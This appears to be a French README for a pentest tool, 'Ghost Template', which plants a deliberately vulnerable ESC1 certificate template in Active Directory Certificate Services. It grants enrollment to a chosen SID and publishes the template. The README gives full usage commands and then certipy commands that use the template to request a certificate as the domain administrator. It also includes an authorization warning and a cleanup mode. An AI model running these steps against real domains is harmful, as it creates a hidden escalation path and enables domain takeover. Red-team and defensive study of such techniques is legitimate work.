# Ghost Template

Création (et suppression propre) d'un *certificate template* ESC1 « fantôme »
dans AD CS, via LDAP(S), avec `ldap3` + `impacket`.

L'outil crée un `pKICertificateTemplate` volontairement vulnérable (ESC1 :
`ENROLLEE_SUPPLIES_SUBJECT` + EKU Client Authentication + aucune approbation
manager), l'objet `msPKI-Enterprise-Oid` associé, pose la DACL pour donner
l'enrollment à un SID de votre choix, et publie le template sur la CA.

> A n'utiliser que sur un périmètre pour lequel vous disposez d'une
> autorisation écrite. Cette technique laisse une misconfiguration
> exploitable : pensez au mode `--remove` en fin d'engagement.

## Contexte

J'ai rencontré cette technique en travaillant sur une machine HTB, où
le chemin d'attaque ne passait pas par l'abus d'un template déjà mal
configuré, mais par la **création** d'un template AD CS vulnérable à partir de
droits d'écriture sur les conteneurs PKI. La plupart des outils publics se
concentrent sur l'exploitation de templates existants ; celui-ci automatise la
mise en place propre et scriptable du template, avec le nettoyage associé pour
un usage en mission.

## Prérequis

- Python 3.9+
- `pip install ldap3 impacket`
- Kerberos (optionnel) : `pip install gssapi`
- Côté cible : le compte utilisé doit avoir le droit *Create Child* sur les
  conteneurs `CN=OID` et `CN=Certificate Templates` (délégation PKI ou
  Enterprise Admin). Sans ce droit, les créations échouent en
  `insufficientAccessRights`.


## Utilisation

```bash
# Création + publication
ghost_template.py -u pentester -p 'Passw0rd!' -d corp.local \
    --dc-ip 10.0.0.10 --publish

# Kerberos (ticket dans KRB5CCNAME)
ghost_template.py -u pentester -k -d corp.local \
    --dc-host dc01.corp.local --dc-ip 10.0.0.10 --publish

# Nettoyage (dépublie de la CA, supprime le template et l'objet OID)
ghost_template.py -u pentester -p 'Passw0rd!' -d corp.local \
    --dc-ip 10.0.0.10 --remove
```

Options principales : `--template` (nom), `--enroll-sid` (bénéficiaire, défaut
`S-1-5-11`), `--ca` (cible une CA précise), `-v` (debug).

## Abus après création

```bash
certipy find -u pentester@corp.local -dc-ip 10.0.0.10 -vulnerable -stdout
certipy req  -u pentester@corp.local -dc-ip 10.0.0.10 \
    -ca <NOM_CA> -template EmployeeAuthTemplate -upn administrator@corp.local
```
